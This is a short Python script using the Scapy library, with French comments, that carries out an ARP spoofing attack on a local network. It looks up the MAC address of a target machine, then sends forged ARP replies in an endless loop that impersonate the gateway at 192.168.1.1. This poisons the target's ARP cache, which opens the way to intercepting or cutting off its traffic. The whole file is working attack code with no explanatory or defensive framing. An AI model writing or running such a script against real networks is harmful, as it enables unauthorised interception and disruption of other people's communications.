from scapy.all import *

# Configuration
conf.iface = "wlo1"# Interface réseau utilisée
conf.verb = 0 # Déactivation des notifications
conf.checkIPaddr = False# désactiver la vérification des adresses par Scapy

def GetMacAddress(ip):

	on, off = srp(Ether(dst='FF:FF:FF:FF:FF:FF')/ARP(pdst=ip), timeout=3)

	if on:
		print('{} is at {}'.format(ip, on[0][1].hwsrc))
		return on[0][1].hwsrc# Récupération de la MAC Address dans la réponse ARP
	else:
		print('Unable to get MAC Address FROM {}'.format(ip))
		exit()

target_ip = '192.168.1.13'# IP cible
host_ip = '192.168.1.1'# L'hôte a usurper

target_mac = GetMacAddress(target_ip)# Récupération de la mac address de l'IP ciblée

ARP_REPLY = ARP(psrc=host_ip, pdst=target_ip, hwdst=target_mac, op=2)
send(ARP_REPLY, loop=1)




